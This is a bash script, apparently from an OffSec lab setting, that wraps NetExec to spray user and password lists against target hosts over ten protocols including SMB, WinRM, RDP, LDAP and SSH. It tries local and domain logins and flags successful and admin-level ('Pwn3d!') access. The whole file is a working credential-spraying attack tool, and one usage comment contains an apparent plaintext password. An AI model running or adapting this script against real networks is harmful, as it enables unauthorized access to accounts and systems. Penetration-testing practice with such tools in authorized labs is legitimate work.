#!/bin/bash
# nxc-spray.sh - flexible NetExec auto-spray across protocols
# Usage: #   ./nxc-spray.sh -t <target_or_file> -u <user_or_file> -p <pass_or_file> [-d domain] [-P "smb rdp winrm"]
# chmod +x nxc-spray.sh
# $> ./nxc-spray.sh -t 192.168.135.250 -u offsec -p lab #(single target, single creds)
# $> ./nxc-spray.sh -t ext_targets.txt -u offsec -p 'Sjb40djTqhMYKpvQuG2Z' -d medtech.com #(target list, single creds, known domain)
# $> ./nxc-spray.sh -t ext_targets.txt -u users.txt -p passwords.txt -d medtech.com #(full spray: userlist + passlist against target list)
# $> ./nxc-spray.sh -t ext_targets.txt -u offsec -p lab -P "smb winrm rdp" #(only specific protocols instead of all 10)

set -u

DEFAULT_PROTOS="smb winrm rdp ldap ftp ssh mysql vnc nfs wmi"

TARGET=""
USER=""
PASS=""
DOMAIN=""
PROTOS="$DEFAULT_PROTOS"

usage() {
    echo "Usage: $0 -t <target_or_file> -u <user_or_file> -p <pass_or_file> [-d domain] [-P \"proto list\"]"
    exit 1
}

while getopts "t:u:p:d:P:h" opt; do
    case "$opt" in
        t) TARGET="$OPTARG" ;;
        u) USER="$OPTARG" ;;
        p) PASS="$OPTARG" ;;
        d) DOMAIN="$OPTARG" ;;
        P) PROTOS="$OPTARG" ;;
        h) usage ;;
        *) usage ;;
    esac
done

[ -z "$TARGET" ] && usage
[ -z "$USER" ] && usage
[ -z "$PASS" ] && usage

# --- Resolve target arg: file or single IP ---
if [ -f "$TARGET" ]; then
    TARGET_ARG="$TARGET"
    TARGET_LIST="$TARGET"
else
    TARGET_ARG="$TARGET"
    TARGET_LIST=$(mktemp)
    echo "$TARGET" > "$TARGET_LIST"
fi

# --- Resolve user arg: file or single value -> nxc flag ---
if [ -f "$USER" ]; then
    USER_FLAG="-u $USER"
else
    USER_FLAG="-u $USER"
fi

# --- Resolve pass arg: file or single value -> nxc flag ---
if [ -f "$PASS" ]; then
    PASS_FLAG="-p $PASS"
else
    PASS_FLAG="-p $PASS"
fi

echo "[*] Target(s): $TARGET"
echo "[*] User(s):   $USER"
echo "[*] Pass(es):  $PASS"
echo "[*] Domain:    ${DOMAIN:-<none>}"
echo "[*] Protocols: $PROTOS"
echo

# --- Liveness pre-check (best effort, ping only) ---
echo "[*] Checking host reachability..."
LIVE=0
TOTAL=0
while read -r ip; do
    [ -z "$ip" ] && continue
    TOTAL=$((TOTAL+1))
    if ping -c1 -W1 "$ip" &>/dev/null; then
        LIVE=$((LIVE+1))
    else
        echo "[!] $ip unreachable (dead host, firewalled, or wrong subnet?)"
    fi
done < "$TARGET_LIST"

if [ "$LIVE" -eq 0 ]; then
    echo "[X] ZERO hosts responded to ping. Double check your target/subnet before continuing."
    echo "    (Some hosts block ICMP but still have SMB/RDP open - override by editing script if needed)"
    read -p "Continue anyway? [y/N] " ans
    [ "$ans" != "y" ] && [ "$ans" != "Y" ] && exit 1
else
    echo "[+] $LIVE/$TOTAL hosts alive"
fi
echo

# --- Main spray loop ---
for proto in $PROTOS; do
    echo "############################################"
    echo "### $proto"
    echo "############################################"

    # Try WITHOUT domain (local accounts)
    echo "--- $proto (no domain / local account) ---"
    nxc "$proto" "$TARGET_ARG" $USER_FLAG $PASS_FLAG --continue-on-success 2>/dev/null

    # Try WITH domain, if provided (domain accounts)
    if [ -n "$DOMAIN" ]; then
        echo "--- $proto (domain: $DOMAIN) ---"
        nxc "$proto" "$TARGET_ARG" $USER_FLAG $PASS_FLAG -d "$DOMAIN" --continue-on-success 2>/dev/null
    fi
    echo
done

# cleanup temp file if we created one
if [ ! -f "$TARGET" ]; then
    rm -f "$TARGET_LIST"
fi

echo "[*] Done. Look for [+] (auth success) and (Pwn3d!) (admin access) above."
